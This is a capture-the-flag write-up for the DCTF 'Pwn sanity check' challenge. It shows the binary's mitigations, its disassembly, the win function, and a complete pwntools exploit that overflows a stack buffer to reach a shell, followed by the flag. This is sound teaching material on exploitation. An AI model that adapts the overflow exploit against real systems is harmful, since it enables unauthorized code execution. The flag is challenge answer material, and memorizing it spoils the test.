# Pwn sanity check

This should take about 1337 seconds to solve.
nc dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io 7480

## Challenge

We have an unstripped binary with a simple buffer overflow vulnerability and a win function.

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### Buffer overflow

```asm
[0x004005b0]> pdf @ sym.vuln
            ; CALL XREF from main @ 0x4007a4
┌ 92: sym.vuln ();
│           ; var char *s @ rbp-0x40
│           ; var uint32_t var_4h @ rbp-0x4
│           0x00400730      55             push rbp
│           0x00400731      4889e5         mov rbp, rsp
│           0x00400734      4883ec40       sub rsp, 0x40
│           0x00400738      488d3dd10100.  lea rdi, str.tell_me_a_joke ; 0x400910 ; "tell me a joke" ; const char *s
│           0x0040073f      e80cfeffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00400744      488b15150920.  mov rdx, qword [obj.stdin]  ; obj.stdin__GLIBC_2.2.5
│                                                                      ; [0x601060:8]=0 ; FILE *stream
│           0x0040074b      488d45c0       lea rax, [s]
│           0x0040074f      be00010000     mov esi, 0x100              ; 256 ; int size
│           0x00400754      4889c7         mov rdi, rax                ; char *s
│           0x00400757      e834feffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
│           0x0040075c      817dfcdec0ad.  cmp dword [var_4h], 0xdeadc0de
│       ┌─< 0x00400763      7518           jne 0x40077d
│       │   0x00400765      488d3db40100.  lea rdi, str.very_good__here_is_a_shell_for_you._ ; 0x400920 ; "very good, here is a shell for you. " ; const char *s
│       │   0x0040076c      e8dffdffff     call sym.imp.puts           ; int puts(const char *s)
│       │   0x00400771      b800000000     mov eax, 0
│       │   0x00400776      e879ffffff     call sym.shell
│      ┌──< 0x0040077b      eb0c           jmp 0x400789
│      ││   ; CODE XREF from sym.vuln @ 0x400763
│      │└─> 0x0040077d      488d3dc10100.  lea rdi, str.will_this_work_ ; 0x400945 ; "will this work?" ; const char *s
│      │    0x00400784      e8c7fdffff     call sym.imp.puts           ; int puts(const char *s)
│      │    ; CODE XREF from sym.vuln @ 0x40077b
│      └──> 0x00400789      90             nop
│           0x0040078a      c9             leave
└           0x0040078b      c3             ret
```

### Win Function

```c
void sym.win(uint32_t arg1, uint32_t arg2)
{
    uint32_t var_8h;
    uint32_t var_4h;

    sym.imp.puts("you made it to win land, no free handouts this time, try harder");
    if (arg1 == 0xdeadbeef) {
        sym.imp.puts("one down, one to go!");
        if (arg2 == 0x1337c0de) {
            sym.imp.puts("2/2 bro good job");
            sym.imp.system("/bin/sh");
            sym.imp.exit(0);
        }
    }
    return;
}
```

## Solution

The win function requires that we set the first 2 arguments to specific values.
This can be done using ROP gadgets.

However, the simpler solution is to jump past these checks, straight to the line that spawns a shell.
Using this method, we only need to overwrite the return address with a single address.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io --port 7480 pwn_sanity_check
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('pwn_sanity_check')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io'
port = int(args.PORT or 7480)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

shell = 0x004006db

payload = flat({
    0x40+0x8: shell,
    })

io.recvuntil("tell me a joke\n")
io.sendline(payload)
io.recvuntil("will this work?\n")

io.interactive()
```

## Flag

`dctf{Ju5t_m0v3_0n}`

